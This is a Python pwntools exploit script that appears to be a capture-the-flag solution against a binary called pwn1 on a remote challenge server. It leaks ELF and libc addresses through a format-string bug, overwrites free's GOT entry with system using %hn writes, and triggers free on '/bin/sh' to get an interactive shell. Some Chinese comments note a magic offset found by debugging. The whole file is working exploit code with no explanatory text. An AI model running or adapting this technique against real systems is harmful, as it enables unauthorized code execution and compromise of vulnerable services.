from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/pwn1')

# p = process('../file/pwn1')
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

p = remote('61.147.171.105', '59803')
libc = ELF('../file/libc.so.6')

p.sendlineafter(b'Code:\n', b'2')
p.sendlineafter(b'Name:\n', b'fill free got')

payload = b'a' * 1000 + b'bb%389$p,%397$p'
p.sendlineafter(b'Code:\n', b'1')
p.sendlineafter(b'2017:\n', payload)

p.recvuntil(b'0x')
elf.address = int(p.recvuntil(b',', drop=True), 16) - 0xcf9
p.recvuntil(b'0x')

# 本地
# libc.address = int(p.recvuntil(b'\n', drop=True), 16) - 171408

# 远程
libc.address = int(p.recvuntil(b'\n', drop=True), 16) - 133168

pause()

got_free_addr = elf.got['free']
system_addr = libc.sym['system']

payload = 'a' * 1000 + f'bb%{u16(p64(system_addr)[:2])-1002-20}c%133$hn'.ljust(16, 'a') # 减20是通过调试确定，原因不知道
payload = payload.encode() + p64(got_free_addr)
p.sendlineafter(b'Code:\n', b'1')
p.sendlineafter(b'2017:\n', payload)

payload = 'a' * 1000 + f'bb%{u16(p64(system_addr)[2:4])-1002-20}c%133$hn'.ljust(16, 'a') # 减20是通过调试确定，原因不知道
payload = payload.encode() + p64(got_free_addr + 2)
p.sendlineafter(b'Code:\n', b'1')
p.sendlineafter(b'2017:\n', payload)

payload = 'a' * 1000 + f'bb%{u16(p64(system_addr)[4:6])-1002-20}c%133$hn'.ljust(16, 'a') # 减20是通过调试确定，原因不知道
payload = payload.encode() + p64(got_free_addr + 4)
p.sendlineafter(b'Code:\n', b'1')
p.sendlineafter(b'2017:\n', payload)

p.sendlineafter(b'Code:\n', b'2')
p.sendlineafter(b'Name:\n', b'/bin/sh')

p.interactive()